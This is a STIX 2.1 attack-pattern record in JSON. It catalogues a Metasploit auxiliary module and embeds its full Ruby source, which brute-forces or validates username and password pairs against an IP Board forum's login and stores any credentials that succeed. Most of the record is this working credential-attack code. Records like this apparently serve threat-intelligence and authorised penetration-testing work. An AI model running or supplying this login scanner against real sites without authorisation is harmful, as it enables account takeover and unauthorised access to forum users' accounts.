{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--84b099a2-9815-4838-adbd-a1475aa6261b",
    "created": "2024-08-14T16:29:04.558785Z",
    "modified": "2024-08-14T16:29:04.558789Z",
    "name": "IP Board Login Auxiliary Module",
    "description": " This module attempts to validate user provided credentials against an IP Board web application. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/ipboard_login.rb",
            "external_id": "ipboard_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/ipboard'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'IP Board Login Auxiliary Module',\n      'Description' => %q{\n        This module attempts to validate user provided credentials against\n        an IP Board web application.\n        },\n      'Author'      => 'Christopher Truncer chris@christophertruncer.com',\n      'License'     => MSF_LICENSE\n    )\n\n    register_options([\n        OptString.new('TARGETURI', [true, \"The directory of the IP Board install\", \"/forum/\"]),\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def run_host(ip)\n    cred_collection = build_credential_collection(\n        username: datastore['USERNAME'],\n        password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::IPBoard.new(\n      configure_http_login_scanner(\n        uri: normalize_uri(target_uri.path),\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5,\n        http_username: datastore['HttpUsername'],\n        http_password: datastore['HttpPassword']\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      case result.status\n        when Metasploit::Model::Login::Status::SUCCESSFUL\n          print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n          credential_core = create_credential(credential_data)\n          credential_data[:core] = credential_core\n          create_credential_login(credential_data)\n          :next_user\n        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => result.proof\n          end\n          invalidate_login(credential_data)\n          :abort\n        when Metasploit::Model::Login::Status::INCORRECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n          end\n          invalidate_login(credential_data)\n      end\n    end\n\n  end\nend\n"
}